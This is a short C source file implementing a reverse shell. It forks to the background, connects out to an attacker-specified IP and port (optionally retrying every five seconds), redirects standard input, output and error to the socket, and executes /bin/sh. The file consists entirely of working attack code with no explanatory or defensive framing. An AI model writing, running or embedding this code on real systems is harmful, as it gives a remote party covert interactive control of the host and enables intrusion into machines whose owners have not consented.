#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEFAULT_CLIENT_IP "0.0.0.0"
#define DEFAULT_CLIENT_PORT 0

int main(void) {
    // Check if CLIENT_IP and CLIENT_PORT are defined
    if (strcmp(CLIENT_IP, DEFAULT_CLIENT_IP) == 0 || CLIENT_PORT == DEFAULT_CLIENT_PORT) {
        fprintf(stderr, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n");
        return 1;
    }

    // Fork a child process
    pid_t pid = fork();
    if (pid == -1) {
        perror("[ERROR] fork failed");
        return 1;
    }
    if (pid > 0) {
        // Parent process exits
        return 0;
    }

    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("[ERROR] socket creation failed");
        return 1;
    }

    // Define the server address
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(CLIENT_PORT);
    server_addr.sin_addr.s_addr = inet_addr(CLIENT_IP);

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) != 0) {
#ifdef WAIT_FOR_CLIENT
        // Retry connecting if WAIT_FOR_CLIENT is defined
        while (connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) != 0) {
            sleep(5);
        }
#else
        // Print error message and exit if connection fails
        perror("[ERROR] connect failed");
        return 1;
#endif
    }

    // Redirect standard input, output, and error to the socket
    dup2(sockfd, STDIN_FILENO);
    dup2(sockfd, STDOUT_FILENO);
    dup2(sockfd, STDERR_FILENO);

    // Execute shell
    char *const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    // This line should not be reached unless execve fails
    perror("[ERROR] execve failed");
    return 1;
}
